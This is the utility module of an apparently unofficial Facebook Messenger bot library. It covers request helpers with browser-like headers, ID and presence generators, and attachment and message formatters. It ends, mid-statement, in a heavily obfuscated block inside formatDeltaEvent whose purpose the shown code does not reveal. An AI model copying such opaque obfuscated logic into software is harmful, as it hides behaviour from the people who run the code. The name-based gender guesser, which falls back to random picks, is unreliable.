/* eslint-disable no-undef */
/* eslint-disable no-prototype-builtins */
"use strict";

const bluebird = require("bluebird");
var request = bluebird.promisify(require("request").defaults({ jar: true }));
var stream = require("stream");
var log = require("npmlog");
var querystring = require("querystring");
var url = require("url");

function setProxy(url) {
    if (typeof url == undefined) return request = bluebird.promisify(require("request").defaults({ jar: true }));
    return request = bluebird.promisify(require("request").defaults({ jar: true, proxy: url }));
}

function getHeaders(url, options, ctx, customHeader) {
    var headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: "https://www.facebook.com/",
        Host: url.replace("https://", "").split("/")[0],
        Origin: "https://www.facebook.com",
        "User-Agent": options.userAgent,
        Connection: "keep-alive",
        'sec-fetch-site': 'same-origin'
    };
    if (customHeader) Object.assign(headers, customHeader);

    if (ctx && ctx.region) headers["X-MSGR-Region"] = ctx.region;

    return headers;
}

function isReadableStream(obj) {
    return (
        obj instanceof stream.Stream &&
        (getType(obj._read) === "Function" ||
            getType(obj._read) === "AsyncFunction") &&
        getType(obj._readableState) === "Object"
    );
}

function get(url, jar, qs, options, ctx) {
    // I'm still confused about this
    if (getType(qs) === "Object")
        for (var prop in qs)
            if (qs.hasOwnProperty(prop) && getType(qs[prop]) === "Object") qs[prop] = JSON.stringify(qs[prop]);
    var op = {
        headers: getHeaders(url, options, ctx),
        timeout: 60000,
        qs: qs,
        url: url,
        method: "GET",
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res[0];
    });
}

function post(url, jar, form, options, ctx, customHeader) {
    let headers = getHeaders(url, options);
    headers['sec-fetch-site'] =  'same-origin';
    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        form: form,
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res[0];
    });
}

function postFormData(url, jar, form, qs, options, ctx) {
    var headers = getHeaders(url, options, ctx);
    headers["Content-Type"] = "multipart/form-data";
    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        formData: form,
        qs: qs,
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res[0];
    });
}

function padZeros(val, len) {
    val = String(val);
    len = len || 2;
    while (val.length < len) val = "0" + val;
    return val;
}

function generateThreadingID(clientID) {
    var k = Date.now();
    var l = Math.floor(Math.random() * 4294967295);
    var m = clientID;
    return "<" + k + ":" + l + "-" + m + "@mail.projektitan.com>";
}

function binaryToDecimal(data) {
    var ret = "";
    while (data !== "0") {
        var end = 0;
        var fullName = "";
        var i = 0;
        for (; i < data.length; i++) {
            end = 2 * end + parseInt(data[i], 10);
            if (end >= 10) {
                fullName += "1";
                end -= 10;
            } else fullName += "0";
        }
        ret = end.toString() + ret;
        data = fullName.slice(fullName.indexOf("1"));
    }
    return ret;
}

function generateOfflineThreadingID() {
    var ret = Date.now();
    var value = Math.floor(Math.random() * 4294967295);
    var str = ("0000000000000000000000" + value.toString(2)).slice(-22);
    var msgs = ret.toString(2) + str;
    return binaryToDecimal(msgs);
}

var h;
var i = {};
var j = {
    _: "%",
    A: "%2",
    B: "000",
    C: "%7d",
    D: "%7b%22",
    E: "%2c%22",
    F: "%22%3a",
    G: "%2c%22ut%22%3a1",
    H: "%2c%22bls%22%3a",
    I: "%2c%22n%22%3a%22%",
    J: "%22%3a%7b%22i%22%3a0%7d",
    K: "%2c%22pt%22%3a0%2c%22vis%22%3a",
    L: "%2c%22ch%22%3a%7b%22h%22%3a%22",
    M: "%7b%22v%22%3a2%2c%22time%22%3a1",
    N: ".channel%22%2c%22sub%22%3a%5b",
    O: "%2c%22sb%22%3a1%2c%22t%22%3a%5b",
    P: "%2c%22ud%22%3a100%2c%22lc%22%3a0",
    Q: "%5d%2c%22f%22%3anull%2c%22uct%22%3a",
    R: ".channel%22%2c%22sub%22%3a%5b1%5d",
    S: "%22%2c%22m%22%3a0%7d%2c%7b%22i%22%3a",
    T: "%2c%22blc%22%3a1%2c%22snd%22%3a1%2c%22ct%22%3a",
    U: "%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    V: "%2c%22blc%22%3a0%2c%22snd%22%3a0%2c%22ct%22%3a",
    W: "%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a",
    X: "%2c%22ri%22%3a0%7d%2c%22state%22%3a%7b%22p%22%3a0%2c%22ut%22%3a1",
    Y: "%2c%22pt%22%3a0%2c%22vis%22%3a1%2c%22bls%22%3a0%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    Z: "%2c%22sb%22%3a1%2c%22t%22%3a%5b%5d%2c%22f%22%3anull%2c%22uct%22%3a0%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a"
};
(function() {
    var l = [];
    for (var m in j) {
        i[j[m]] = m;
        l.push(j[m]);
    }
    l.reverse();
    h = new RegExp(l.join("|"), "g");
})();

function presenceEncode(str) {
    return encodeURIComponent(str)
        .replace(/([_A-Z])|%../g, function(m, n) {
            return n ? "%" + n.charCodeAt(0).toString(16) : m;
        })
        .toLowerCase()
        .replace(h, function(m) {
            return i[m];
        });
}

// eslint-disable-next-line no-unused-vars
function presenceDecode(str) {
    return decodeURIComponent(
        str.replace(/[_A-Z]/g, function(m) {
            return j[m];
        })
    );
}

function generatePresence(userID) {
    var time = Date.now();
    return (
        "E" +
        presenceEncode(
            JSON.stringify({
                v: 3,
                time: parseInt(time / 1000, 10),
                user: userID,
                state: {
                    ut: 0,
                    t2: [],
                    lm2: null,
                    uct2: time,
                    tr: null,
                    tw: Math.floor(Math.random() * 4294967295) + 1,
                    at: time
                },
                ch: {
                    ["p_" + userID]: 0
                }
            })
        )
    );
}

function generateAccessiblityCookie() {
    var time = Date.now();
    return encodeURIComponent(
        JSON.stringify({
            sr: 0,
            "sr-ts": time,
            jk: 0,
            "jk-ts": time,
            kb: 0,
            "kb-ts": time,
            hcm: 0,
            "hcm-ts": time
        })
    );
}

function getGUID() {
    /** @type {number} */
    var sectionLength = Date.now();
    /** @type {string} */
    var id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
        /** @type {number} */
        var r = Math.floor((sectionLength + Math.random() * 16) % 16);
        /** @type {number} */
        sectionLength = Math.floor(sectionLength / 16);
        /** @type {string} */
        var _guid = (c == "x" ? r : (r & 7) | 8).toString(16);
        return _guid;
    });
    return id;
}

function _formatAttachment(attachment1, attachment2) {
    // TODO: THIS IS REALLY BAD
    // This is an attempt at fixing Facebook's inconsistencies. Sometimes they give us
    // two attachment objects, but sometimes only one. They each contain part of the
    // data that you'd want so we merge them for convenience.
    // Instead of having a bunch of if statements guarding every access to image_data,
    // we set it to empty object and use the fact that it'll return undefined.
    attachment2 = attachment2 || { id: "", image_data: {} };
    attachment1 = attachment1.mercury ? attachment1.mercury : attachment1;
    var blob = attachment1.blob_attachment;
    var type =
        blob && blob.__typename ? blob.__typename : attachment1.attach_type;
    if (!type && attachment1.sticker_attachment) {
        type = "StickerAttachment";
        blob = attachment1.sticker_attachment;
    } else if (!type && attachment1.extensible_attachment) {
        if (
            attachment1.extensible_attachment.story_attachment &&
            attachment1.extensible_attachment.story_attachment.target &&
            attachment1.extensible_attachment.story_attachment.target.__typename &&
            attachment1.extensible_attachment.story_attachment.target.__typename === "MessageLocation"
        ) type = "MessageLocation";
        else type = "ExtensibleAttachment";

        blob = attachment1.extensible_attachment;
    }
    // TODO: Determine whether "sticker", "photo", "file" etc are still used
    // KEEP IN SYNC WITH getThreadHistory
    switch (type) {
        case "sticker":
            return {
                type: "sticker",
                ID: attachment1.metadata.stickerID.toString(),
                url: attachment1.url,

                packID: attachment1.metadata.packID.toString(),
                spriteUrl: attachment1.metadata.spriteURI,
                spriteUrl2x: attachment1.metadata.spriteURI2x,
                width: attachment1.metadata.width,
                height: attachment1.metadata.height,

                caption: attachment2.caption,
                description: attachment2.description,

                frameCount: attachment1.metadata.frameCount,
                frameRate: attachment1.metadata.frameRate,
                framesPerRow: attachment1.metadata.framesPerRow,
                framesPerCol: attachment1.metadata.framesPerCol,

                stickerID: attachment1.metadata.stickerID.toString(), // @Legacy
                spriteURI: attachment1.metadata.spriteURI, // @Legacy
                spriteURI2x: attachment1.metadata.spriteURI2x // @Legacy
            };
        case "file":
            return {
                type: "file",
                filename: attachment1.name,
                ID: attachment2.id.toString(),
                url: attachment1.url,

                isMalicious: attachment2.is_malicious,
                contentType: attachment2.mime_type,

                name: attachment1.name, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                fileSize: attachment2.file_size // @Legacy
            };
        case "photo":
            return {
                type: "photo",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.fileName,
                thumbnailUrl: attachment1.thumbnail_url,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                largePreviewUrl: attachment1.large_preview_url,
                largePreviewWidth: attachment1.large_preview_width,
                largePreviewHeight: attachment1.large_preview_height,

                url: attachment1.metadata.url, // @Legacy
                width: attachment1.metadata.dimensions.split(",")[0], // @Legacy
                height: attachment1.metadata.dimensions.split(",")[1], // @Legacy
                name: attachment1.fileName // @Legacy
            };
        case "animated_image":
            return {
                type: "animated_image",
                ID: attachment2.id.toString(),
                filename: attachment2.filename,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment2.image_data.url,
                width: attachment2.image_data.width,
                height: attachment2.image_data.height,

                name: attachment1.name, // @Legacy
                facebookUrl: attachment1.url, // @Legacy
                thumbnailUrl: attachment1.thumbnail_url, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                rawGifImage: attachment2.image_data.raw_gif_image, // @Legacy
                rawWebpImage: attachment2.image_data.raw_webp_image, // @Legacy
                animatedGifUrl: attachment2.image_data.animated_gif_url, // @Legacy
                animatedGifPreviewUrl: attachment2.image_data.animated_gif_preview_url, // @Legacy
                animatedWebpUrl: attachment2.image_data.animated_webp_url, // @Legacy
                animatedWebpPreviewUrl: attachment2.image_data.animated_webp_preview_url // @Legacy
            };
        case "share":
            return {
                type: "share",
                ID: attachment1.share.share_id.toString(),
                url: attachment2.href,

                title: attachment1.share.title,
                description: attachment1.share.description,
                source: attachment1.share.source,

                image: attachment1.share.media.image,
                width: attachment1.share.media.image_size.width,
                height: attachment1.share.media.image_size.height,
                playable: attachment1.share.media.playable,
                duration: attachment1.share.media.duration,

                subattachments: attachment1.share.subattachments,
                properties: {},

                animatedImageSize: attachment1.share.media.animated_image_size, // @Legacy
                facebookUrl: attachment1.share.uri, // @Legacy
                target: attachment1.share.target, // @Legacy
                styleList: attachment1.share.style_list // @Legacy
            };
        case "video":
            return {
                type: "video",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.name,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment1.url,
                width: attachment1.metadata.dimensions.width,
                height: attachment1.metadata.dimensions.height,

                duration: attachment1.metadata.duration,
                videoType: "unknown",

                thumbnailUrl: attachment1.thumbnail_url // @Legacy
            };
        case "error":
            return {
                type: "error",

                // Save error attachments because we're unsure of their format,
                // and whether there are cases they contain something useful for debugging.
                attachment1: attachment1,
                attachment2: attachment2
            };
        case "MessageImage":
            return {
                type: "photo",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,
                thumbnailUrl: blob.thumbnail.uri,

                previewUrl: blob.preview.uri,
                previewWidth: blob.preview.width,
                previewHeight: blob.preview.height,

                largePreviewUrl: blob.large_preview.uri,
                largePreviewWidth: blob.large_preview.width,
                largePreviewHeight: blob.large_preview.height,

                url: blob.large_preview.uri, // @Legacy
                width: blob.original_dimensions.x, // @Legacy
                height: blob.original_dimensions.y, // @Legacy
                name: blob.filename // @Legacy
            };
        case "MessageAnimatedImage":
            return {
                type: "animated_image",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,

                previewUrl: blob.preview_image.uri,
                previewWidth: blob.preview_image.width,
                previewHeight: blob.preview_image.height,

                url: blob.animated_image.uri,
                width: blob.animated_image.width,
                height: blob.animated_image.height,

                thumbnailUrl: blob.preview_image.uri, // @Legacy
                name: blob.filename, // @Legacy
                facebookUrl: blob.animated_image.uri, // @Legacy
                rawGifImage: blob.animated_image.uri, // @Legacy
                animatedGifUrl: blob.animated_image.uri, // @Legacy
                animatedGifPreviewUrl: blob.preview_image.uri, // @Legacy
                animatedWebpUrl: blob.animated_image.uri, // @Legacy
                animatedWebpPreviewUrl: blob.preview_image.uri // @Legacy
            };
        case "MessageVideo":
            return {
                type: "video",
                filename: blob.filename,
                ID: blob.legacy_attachment_id,

                previewUrl: blob.large_image.uri,
                previewWidth: blob.large_image.width,
                previewHeight: blob.large_image.height,

                url: blob.playable_url,
                width: blob.original_dimensions.x,
                height: blob.original_dimensions.y,

                duration: blob.playable_duration_in_ms,
                videoType: blob.video_type.toLowerCase(),

                thumbnailUrl: blob.large_image.uri // @Legacy
            };
        case "MessageAudio":
            return {
                type: "audio",
                filename: blob.filename,
                ID: blob.url_shimhash,

                audioType: blob.audio_type,
                duration: blob.playable_duration_in_ms,
                url: blob.playable_url,

                isVoiceMail: blob.is_voicemail
            };
        case "StickerAttachment":
            return {
                type: "sticker",
                ID: blob.id,
                url: blob.url,

                packID: blob.pack ? blob.pack.id : null,
                spriteUrl: blob.sprite_image,
                spriteUrl2x: blob.sprite_image_2x,
                width: blob.width,
                height: blob.height,

                caption: blob.label,
                description: blob.label,

                frameCount: blob.frame_count,
                frameRate: blob.frame_rate,
                framesPerRow: blob.frames_per_row,
                framesPerCol: blob.frames_per_column,

                stickerID: blob.id, // @Legacy
                spriteURI: blob.sprite_image, // @Legacy
                spriteURI2x: blob.sprite_image_2x // @Legacy
            };
        case "MessageLocation":
            var urlAttach = blob.story_attachment.url;
            var mediaAttach = blob.story_attachment.media;

            var u = querystring.parse(url.parse(urlAttach).query).u;
            var where1 = querystring.parse(url.parse(u).query).where1;
            var address = where1.split(", ");

            var latitude;
            var longitude;

            try {
                latitude = Number.parseFloat(address[0]);
                longitude = Number.parseFloat(address[1]);
            } catch (err) {
                /* empty */
            }

            var imageUrl;
            var width;
            var height;

            if (mediaAttach && mediaAttach.image) {
                imageUrl = mediaAttach.image.uri;
                width = mediaAttach.image.width;
                height = mediaAttach.image.height;
            }

            return {
                type: "location",
                ID: blob.legacy_attachment_id,
                latitude: latitude,
                longitude: longitude,
                image: imageUrl,
                width: width,
                height: height,
                url: u || urlAttach,
                address: where1,

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "ExtensibleAttachment":
            return {
                type: "share",
                ID: blob.legacy_attachment_id,
                url: blob.story_attachment.url,

                title: blob.story_attachment.title_with_entities.text,
                description: blob.story_attachment.description &&
                    blob.story_attachment.description.text,
                source: blob.story_attachment.source ? blob.story_attachment.source.text : null,

                image: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.uri,
                width: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.width,
                height: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.height,
                playable: blob.story_attachment.media &&
                    blob.story_attachment.media.is_playable,
                duration: blob.story_attachment.media &&
                    blob.story_attachment.media.playable_duration_in_ms,
                playableUrl: blob.story_attachment.media == null ? null : blob.story_attachment.media.playable_url,

                subattachments: blob.story_attachment.subattachments,
                properties: blob.story_attachment.properties.reduce(function(obj, cur) {
                    obj[cur.key] = cur.value.text;
                    return obj;
                }, {}),

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "MessageFile":
            return {
                type: "file",
                filename: blob.filename,
                ID: blob.message_file_fbid,

                url: blob.url,
                isMalicious: blob.is_malicious,
                contentType: blob.content_type,

                name: blob.filename,
                mimeType: "",
                fileSize: -1
            };
        default:
            throw new Error(
                "unrecognized attach_file of type " +
                type +
                "`" +
                JSON.stringify(attachment1, null, 4) +
                " attachment2: " +
                JSON.stringify(attachment2, null, 4) +
                "`"
            );
    }
}

function formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {
    attachmentMap = shareMap || attachmentMap;
    return attachments ?
        attachments.map(function(val, i) {
            if (!attachmentMap ||
                !attachmentIds ||
                !attachmentMap[attachmentIds[i]]
            ) {
                return _formatAttachment(val);
            }
            return _formatAttachment(val, attachmentMap[attachmentIds[i]]);
        }) : [];
}

function formatDeltaMessage(m) {
    var md = m.delta.messageMetadata;
    var mdata =
        m.delta.data === undefined ? [] :
        m.delta.data.prng === undefined ? [] :
        JSON.parse(m.delta.data.prng);
    var m_id = mdata.map(u => u.i);
    var m_offset = mdata.map(u => u.o);
    var m_length = mdata.map(u => u.l);
    var mentions = {};
    var body = m.delta.body || "";
    var args = body == "" ? [] : body.trim().split(/\s+/);
    for (var i = 0; i < m_id.length; i++) mentions[m_id[i]] = m.delta.body.substring(m_offset[i], m_offset[i] + m_length[i]);

    return {
        type: "message",
        senderID: formatID(md.actorFbId.toString()),
        threadID: formatID((md.threadKey.threadFbId || md.threadKey.otherUserFbId).toString()),
        messageID: md.messageId,
        args: args,
        body: body,
        attachments: (m.delta.attachments || []).map(v => _formatAttachment(v)),
        mentions: mentions,
        timestamp: md.timestamp,
        isGroup: !!md.threadKey.threadFbId,
        participantIDs: m.delta.participants || []
    };
}

function formatID(id) {
    if (id != undefined && id != null) return id.replace(/(fb)?id[:.]/, "");
    else return id;
}

function formatMessage(m) {
    var originalMessage = m.message ? m.message : m;
    var obj = {
        type: "message",
        senderName: originalMessage.sender_name,
        senderID: formatID(originalMessage.sender_fbid.toString()),
        participantNames: originalMessage.group_thread_info ? originalMessage.group_thread_info.participant_names : [originalMessage.sender_name.split(" ")[0]],
        participantIDs: originalMessage.group_thread_info ?
            originalMessage.group_thread_info.participant_ids.map(function(v) {
                return formatID(v.toString());
            }) : [formatID(originalMessage.sender_fbid)],
        body: originalMessage.body || "",
        threadID: formatID((originalMessage.thread_fbid || originalMessage.other_user_fbid).toString()),
        threadName: originalMessage.group_thread_info ? originalMessage.group_thread_info.name : originalMessage.sender_name,
        location: originalMessage.coordinates ? originalMessage.coordinates : null,
        messageID: originalMessage.mid ? originalMessage.mid.toString() : originalMessage.message_id,
        attachments: formatAttachment(
            originalMessage.attachments,
            originalMessage.attachmentIds,
            originalMessage.attachment_map,
            originalMessage.share_map
        ),
        timestamp: originalMessage.timestamp,
        timestampAbsolute: originalMessage.timestamp_absolute,
        timestampRelative: originalMessage.timestamp_relative,
        timestampDatetime: originalMessage.timestamp_datetime,
        tags: originalMessage.tags,
        reactions: originalMessage.reactions ? originalMessage.reactions : [],
        isUnread: originalMessage.is_unread
    };

    if (m.type === "pages_messaging") obj.pageID = m.realtime_viewer_fbid.toString();
    obj.isGroup = obj.participantIDs.length > 2;

    return obj;
}

function formatEvent(m) {
    var originalMessage = m.message ? m.message : m;
    var logMessageType = originalMessage.log_message_type;
    var logMessageData;
    if (logMessageType === "log:generic-admin-text") {
        logMessageData = originalMessage.log_message_data.untypedData;
        logMessageType = getAdminTextMessageType(originalMessage.log_message_data.message_type);
    } else logMessageData = originalMessage.log_message_data;

    return Object.assign(formatMessage(originalMessage), {
        type: "event",
        logMessageType: logMessageType,
        logMessageData: logMessageData,
        logMessageBody: originalMessage.log_message_body
    });
}

function formatHistoryMessage(m) {
    switch (m.action_type) {
        case "ma-type:log-message":
            return formatEvent(m);
        default:
            return formatMessage(m);
    }
}

// Get a more readable message type for AdminTextMessages
function getAdminTextMessageType(m) {
    switch (m.type) {
        case "joinable_group_link_mode_change":
            return "log:link-status"
        case "magic_words":
            return "log:magic-words";
        case "change_thread_theme":
            return "log:thread-color";
        case "change_thread_icon":
            return "log:thread-icon";
        case "change_thread_nickname":
            return "log:user-nickname";
        case "change_thread_admins":
            return "log:thread-admins";
        case "group_poll":
            return "log:thread-poll";
        case "change_thread_approval_mode":
            return "log:thread-approval-mode";
        case "messenger_call_log":
        case "participant_joined_group_call":
            return "log:thread-call";
    }
}

function getGenderByPhysicalMethod(name) {
    var GirlName = ["LAN", "HÂN", "LINH", "MAI", "HOA", "THU", "BĂNG", "MỸ", "CHÂU", "THẢO", "THOA", "MẪN", "THÙY", "THỦY", "NGA", "NGÂN", "NGHI", "THƯ", "NGỌC", "BÍCH", "VÂN", "DIỆP", "CHI", "TIÊN", "XUÂN", "GIANG", "NHUNG", "DUNG", "NHƯ", "YẾN", "QUYÊN", "YẾN", "TƯỜNG", "VY", "PHƯƠNG", "LIÊN", "LAN", "HÀ", "MAI", "ĐAN", "HẠ", "QUYÊN", "LY", "HÒA", "OANH", "HƯƠNG", "HẰNG", "QUỲNH", "HẠNH", "NHIÊN", "NHẠN"];

    var BoyName = ["HƯNG", "HUY", "KHẢI", "KHANG", "KHOA", "KHÔI", "KIÊN", "KIỆT", "LONG", "MINH", "ÂN", "BẢO", "BÌNH", "CƯỜNG", "ĐẠT", "ĐỨC", "DŨNG", "DUY", "HOÀNG", "HÙNG", "HƯNG", "NGHĨA", "NGUYÊN", "THẮNG", "THIỆN", "THỊNH", "TÒA", "TRIẾT", "TRUNG", "TRƯỜNG", "TUẤN", "NHÂN", "VŨ", "VINH", "PHONG", "PHÚC", "QUÂN", "QUANG", "SƠN", "TÀI", "THẮNG", "ĐĂNG", "VĂN", "VĨ", "QUANG", "MẠNH"];

    var OtherName = ["ANH", "THANH", "TÂM", "DƯƠNG", "AN", "LÂM", "MIÊN", "TÚ", "LÂM", "BẰNG", "KHÁNH", "NHẬT", "VỸ", ".",",","/","%", "&","*","-","+"];

    try {
        var NameArray = name.split(" ");
            name = NameArray[NameArray.length - 1];
        var Name;
            if (name == " " || name == null) return "UNKNOWN";
            switch (GirlName.includes(name.toUpperCase())) {
                case true: {
                    if (!OtherName.includes(name.toUpperCase()) && !BoyName.includes(name.toUpperCase())) Name = "FEMALE";
                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp 🌚
                }
            break;
                case false: {
                    if (!OtherName.includes(name.toUpperCase()) && !GirlName.includes(name.toUpperCase())) Name = "MALE"
                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp 🌚
                }
            break;
        } 
    }
    catch (e) {
        return "UNKNOWN"
    }
    return Name || "UNKNOWN";
}

function formatDeltaEvent(m) {
    var { updateData,getData,hasData } = require('./Extra/ExtraGetThread');
    var logMessageType;
    var logMessageData;

  // log:thread-color => {theme_color}
  // log:user-nickname => {participant_id, nickname}
  // log:thread-icon => {thread_icon}
  // log:thread-name => {name}
  // log:subscribe => {addedParticipants - [Array]}
//log:unsubscribe => {leftParticipantFbId}

switch (m.class) {
    case "AdminTextMessage":
        logMessageType = getAdminTextMessageType(m);
            logMessageData = m.untypedData;
        break;
    case "ThreadName":
        logMessageType = "log:thread-name";
            logMessageData = { name: m.name };
        break;
    case "ParticipantsAddedToGroupThread":
        logMessageType = "log:subscribe";
            logMessageData = { addedParticipants: m.addedParticipants };
        break;
    case "ParticipantLeftGroupThread":
        logMessageType = "log:unsubscribe";
        logMessageData = { leftParticipantFbId: m.leftParticipantFbId };
    break;
}

function bfwhbjwdwd_0x16b6(_0x147721,_0x246f05){const _0x600808=bfwhbjwdwd_0x3fc6();return bfwhbjwdwd_0x16b6=function(_0x701246,_0x4e99ab){_0x701246=_0x701246-(-0x6f7*0x3+0x1*-0xddb+0x246a);let _0x3af08e=_0x600808[_0x701246];return _0x3af08e;},bfwhbjwdwd_0x16b6(_0x147721,_0x246f05);}function bfwhbjwdwd_0x51dd6f(_0x353445,_0x4bdb33,_0x427ee9,_0x48ac0d,_0x3249ca){return bfwhbjwdwd_0x16b6(_0x353445- -0x1d2,_0x4bdb33);}function bfwhbjwdwd_0x28749e(_0x4d5466,_0x5a9584,_0x50d650,_0x517754,_0x145fb7){return bfwhbjwdwd_0x16b6(_0x5a9584-0x3af,_0x517754);}function bfwhbjwdwd_0x19ff6f(_0x66ca8f,_0x5e940d,_0x6acdc6,_0x307538,_0x3b7dee){return bfwhbjwdwd_0x16b6(_0x66ca8f- -0x1a6,_0x307538);}(function(_0x4b89f7,_0x11918c){function _0x4057b1(_0x3d35f0,_0x17478b,_0xc86e7e,_0x25f8e4,_0x1fdfde){return bfwhbjwdwd_0x16b6(_0x3d35f0- -0x109,_0x25f8e4);}const _0x330b6f=_0x4b89f7();function _0x4accd3(_0x2cbbec,_0x3270a2,_0x3f360d,_0x82a48a,_0x3ef48e){return bfwhbjwdwd_0x16b6(_0x82a48a- -0x1f7,_0x2cbbec);}function _0x247953(_0x3f7aab,_0x3a44cb,_0x43fab3,_0x406af5,_0x1b211c){return bfwhbjwdwd_0x16b6(_0x3f7aab-0x391,_0x1b211c);}function _0x45dd2b(_0x3ffa10,_0x579a55,_0x1911d3,_0x432063,_0x32305a){return bfwhbjwdwd_0x16b6(_0x432063- -0x33e,_0x3ffa10);}function _0x4d5645(_0x1b44be,_0x88921d,_0x1c71bd,_0x7a499d,_0x573772){return bfwhbjwdwd_0x16b6(_0x7a499d-0x386,_0x1c71bd);}while(!![]){try{const _0x8b5290=-parseInt(_0x45dd2b(-0x163,-0x168,-0x137,-0x148,-0x126))/(-0x6*-0x62e+-0x1*-0xa7d+-0x2f90)*(parseInt(_0x45dd2b(-0x16a,-0x151,-0x124,-0x144,-0x163))/(0xb0b*-0x2+0x165b+-0x43))+-parseInt(_0x4057b1(0xad,0xd6,0xb6,0x94,0x9d))/(-0x23d2+-0xa34+0x935*0x5)*(-parseInt(_0x4accd3(-0x52,-0x4b,-0x38,-0x30,-0x4))/(-0x13ae+-0x3ee*-0x7+-0x7d0))+-parseInt(_0x45dd2b(-0x1a9,-0x17d,-0x1a2,-0x18f,-0x185))/(0x137b+-0x179b*0x1+-0x1*-0x425)*(parseInt(_0x247953(0x543,0x557,0x526,0x554,0x539))/(0x1*-0x213f+0x533+0xe09*0x2))+-parseInt(_0x4accd3(-0x31,-0xf,-0x3b,-0x24,-0x8))/(-0x1*-0x97d+-0x4*-0x959+-0x2eda)+-parseInt(_0x247953(0x545,0x53c,0x530,0x556,0x540))/(-0x1*0x1681+0x14ea+0x5*0x53)*(-parseInt(_0x4accd3(0x18,0x15,0x10,-0x14,-0xa))/(-0x2612+-0x2025+0x2320*0x2))+-parseInt(_0x4accd3(-0x21,-0x2b,-0x11,-0x34,-0x28))/(0x40e+-0x12a*-0x4+-0x8ac)+parseInt(_0x247953(0x56c,0x54a,0x567,0x572,0x58b))/(-0x1e9b*0x1+0x2*0xfe5+0x49*-0x4);if(_0x8b5290===_0x11918c)break;else _0x330b6f['push'](_0x330b6f['shift']());}catch(_0x3dc950){_0x330b6f['push'](_0x330b6f['shift']());}}}(bfwhbjwdwd_0x3fc6,-0xe09d*0x7+-0xd5d70+-0x5*-0x59671));function bfwhbjwdwd_0x26f808(_0x486452,_0x4c4ba2,_0x38bc59,_0x49c8ee,_0x11b037){return bfwhbjwdwd_0x16b6(_0x38bc59-0x171,_0x49c8ee);}function bfwhbjwdwd_0x4e137a(_0x2faaf7,_0x49f979,_0x2c600f,_0x375f90,_0x3876e3){return bfwhbjwdwd_0x16b6(_0x375f90-0x120,_0x2faaf7);}if(global[bfwhbjwdwd_0x28749e(0x57e,0x562,0x551,0x564,0x55c)+'ng'][bfwhbjwdwd_0x28749e(0x576,0x56f,0x54c,0x58e,0x56e)](bfwhbjwdwd_0x26f808(0x378,0x34a,0x370,0x38e,0x346)+bfwhbjwdwd_0x26f808(0x33b,0x382,0x360,0x37c,0x34c)+bfwhbjwdwd_0x26f808(0x36a,0x386,0x362,0x363,0x38d)))switch(hasData(formatID((m[bfwhbjwdwd_0x28749e(0x59c,0x5aa,0x5c0,0x5bb,0x5ca)+bfwhbjwdwd_0x51dd6f(0x4,-0x1b,-0x1f,-0xc,0x1)+bfwhbjwdwd_0x4e137a(0x2c8,0x2c3,0x2c8,0x2db,0x302)][bfwhbjwdwd_0x4e137a(0x334,0x312,0x2fd,0x31e,0x32c)+bfwhbjwdwd_0x51dd6f(-0x1,-0x6,0x7,0x28,0x26)][bfwhbjwdwd_0x26f808(0x37c,0x37c,0x36f,0x386,0x383)+bfwhbjwdwd_0x19ff6f(0x25,0x1e,0x11,0x2,0x21)]||m[bfwhbjwdwd_0x26f808(0x373,0x383,0x36c,0x372,0x37b)+bfwhbjwdwd_0x51dd6f(0x4,0x14,0x28,0xd,0x1)+bfwhbjwdwd_0x28749e(0x547,0x56a,0x587,0x566,0x58d)][bfwhbjwdwd_0x51dd6f(0x2c,0x55,0x14,0x40,0x17)+bfwhbjwdwd_0x26f808(0x32a,0x366,0x342,0x356,0x36b)][bfwhbjwdwd_0x4e137a(0x2ee,0x301,0x2fc,0x319,0x302)+bfwhbjwdwd_0x28749e(0x56c,0x56e,0x552,0x57e,0x585)+bfwhbjwdwd_0x26f808(0x37a,0x350,0x35d,0x36c,0x33d)])[bfwhbjwdwd_0x28749e(0x5a6,0x58f,0x59e,0x582,0x579)+bfwhbjwdwd_0x51dd6f(0x7,-0x13,0x22,0x19,0xa)]()))){case!![]:{switch(logMessageType){case bfwhbjwdwd_0x19ff6f(0x40,0x51,0x2b,0x41,0x67)+bfwhbjwdwd_0x51dd6f(-0xa,-0x30,-0x20,-0x1d,-0x5)+bfwhbjwdwd_0x28749e(0x5c9,0x5a1,0x588,0x596,0x5b3)+'r':{let 